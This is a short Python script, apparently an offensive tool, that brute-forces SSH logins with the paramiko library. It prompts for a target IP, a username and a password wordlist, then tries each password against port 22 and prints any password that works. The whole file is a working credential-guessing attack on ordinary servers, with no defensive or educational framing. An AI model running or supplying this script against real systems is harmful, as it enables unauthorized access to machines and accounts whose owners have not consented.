import paramiko

target = input('Please enter target IP address: ')
username = input('Please enter username to Bruteforce: ')
password_file = input('Please enter location of the Password file: ')

def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
        print(f"[*] Password found: {password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False

def main():
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            if ssh_connect(password):
                break
        else:
            print("[-] Password not found.")

if __name__ == "__main__":
    main()
